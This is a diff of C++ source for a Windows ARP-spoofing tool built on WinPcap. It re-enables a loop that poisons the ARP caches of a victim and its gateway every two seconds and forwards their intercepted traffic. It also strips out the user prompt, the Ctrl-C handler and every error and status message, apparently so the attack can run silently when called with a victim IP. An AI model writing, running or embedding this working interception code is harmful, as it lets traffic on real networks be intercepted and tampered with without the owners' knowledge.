@@ -2,16 +2,6 @@
 
 #include "arpspoof.h"
 
-std::atomic<bool> stop;
-
-BOOL WINAPI CtrlCHandler(DWORD dwCtrlType) {
-	if (dwCtrlType == CTRL_C_EVENT) {
-		stop = true;
-		return TRUE;
-	}
-	return FALSE;
-}
-
 std::string Arpspoof::unicode_to_str(wchar_t *unistr) {
 	char buf[100];
 	int res = WideCharToMultiByte(CP_ACP, 0, unistr, wcslen(unistr), buf, 100, NULL, NULL);
@@ -196,18 +186,15 @@ void Arpspoof::handle_packet(pcap_t *pcap, pcap_pkthdr *header, const uint8_t *d
 	}
 
 	if (pcap_sendpacket(pcap, new_packet, header->len) != 0) {
-		fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(pcap));
+		//fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(pcap));
 		return;
 	}
 }
 
 
-int Arpspoof::SendArpReplayForSpoofing(bool &retflag)
+void Arpspoof::SendArpReplayForSpoofing(std::string victim)
 {
-	retflag = true;
-	std::string victim, target;
-	std::cout << "Please enter a valid ip of victim\n>";
-	std::cin >> victim;
+	std::string target;
 
 	uint8_t victimip[4], targetip[4] = { 0 };
 	{
@@ -231,8 +218,8 @@ int Arpspoof::SendArpReplayForSpoofing(bool &retflag)
 					ifaceidx = i;
 				}
 				else {
-					fprintf(stderr, "Several interfaces match victim IP, use -i");
-					return 1;
+					//fprintf(stderr, "Several interfaces match victim IP, use -i");
+					return;
 				}
 			}
 			i++;
@@ -256,8 +243,8 @@ int Arpspoof::SendArpReplayForSpoofing(bool &retflag)
 		}
 	}
 	if (ifaceidx < 0 || ifaceidx >= (int)ifaces.size()) {
-		fprintf(stderr, "Can't find interface (explicitly specified or matching victim IP)\n");
-		return 1;
+		//fprintf(stderr, "Can't find interface (explicitly specified or matching victim IP)\n");
+		return;
 	}
 	const iface_info& iface = ifaces[ifaceidx];
 	if (target.empty()) {
@@ -268,12 +255,12 @@ int Arpspoof::SendArpReplayForSpoofing(bool &retflag)
 
 	uint8_t victimmac[6], targetmac[6];
 	if (!resolve(iface, victimip, victimmac)) {
-		fprintf(stderr, "Can't resolve victim IP, is it up?\n");
-		return 1;
+		//fprintf(stderr, "Can't resolve victim IP, is it up?\n");
+		return;
 	}
 	if (!resolve(iface, targetip, targetmac)) {
-		fprintf(stderr, "Can't resolve target IP, is it up?\n");
-		return 1;
+		//fprintf(stderr, "Can't resolve target IP, is it up?\n");
+		return;
 	}
 
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -284,53 +271,51 @@ int Arpspoof::SendArpReplayForSpoofing(bool &retflag)
 		errbuf			// error buffer
 	);
 	if (pcap == NULL) {
-		fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", iface.name.c_str());
-		return 1;
+		//fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", iface.name.c_str());
+		return;
 	}
 	/* Check the link layer. We support only Ethernet for simplicity. */
 	if (pcap_datalink(pcap) != DLT_EN10MB)
 	{
-		fprintf(stderr, "This program works only on Ethernet networks.\n");
-		return 1;
+		//fprintf(stderr, "This program works only on Ethernet networks.\n");
+		return;
 	}
-
-	SetConsoleCtrlHandler(CtrlCHandler, TRUE);
 
 	uint8_t arp_spoof_victim[42], arp_spoof_target[42];
 	fill_arp_packet(arp_spoof_victim, victimip, victimmac, targetip, iface.mac);
 	fill_arp_packet(arp_spoof_target, targetip, targetmac, victimip, iface.mac);
 
-	printf("Redirecting %s (%s) ---> %s (%s)\n", ip_to_str(victimip).c_str(), mac_to_str(victimmac).c_str(),
-		ip_to_str(targetip).c_str(), mac_to_str(targetmac).c_str());
+	/*printf("Redirecting %s (%s) ---> %s (%s)\n", ip_to_str(victimip).c_str(), mac_to_str(victimmac).c_str(),
+		ip_to_str(targetip).c_str(), mac_to_str(targetmac).c_str());*/
 
 	time_t next_arp_time = 0;
-	//while (!stop) {
-	//	time_t now = time(nullptr);
-	//	if (now >= next_arp_time) {
-	//		next_arp_time = now + 2;
-	//		if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
-	//			fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
-	//			return 1;
-	//		}
-	//		if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
-	//			fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
-	//			return 1;
-	//		}
-	//	}
+	while (!stop) {
+		time_t now = time(nullptr);
+		if (now >= next_arp_time) {
+			next_arp_time = now + 2;
+			if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
+				//fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
+				return;
+			}
+			if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
+				//fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
+				return;
+			}
+		}
 
-	//	pcap_pkthdr *header;
-	//	const uint8_t *pkt_data;
-	//	int res = pcap_next_ex(pcap, &header, &pkt_data);
-	//	if (res < 0) {
-	//		printf("error\n");
-	//		break;
-	//	}
-	//	else if (res == 0) {
-	//		// timeout
-	//		continue;
-	//	}
-	//	handle_packet(pcap, header, pkt_data, victimmac, victimip, targetmac, iface.mac);
-	//}
-	retflag = false;
-	return {};
+		pcap_pkthdr *header;
+		const uint8_t *pkt_data;
+		int res = pcap_next_ex(pcap, &header, &pkt_data);
+		if (res < 0) {
+			//printf("error\n");
+			break;
+		}
+		else if (res == 0) {
+			// timeout
+			continue;
+		}
+		handle_packet(pcap, header, pkt_data, victimmac, victimip, targetmac, iface.mac);
+	}
 }
+
+
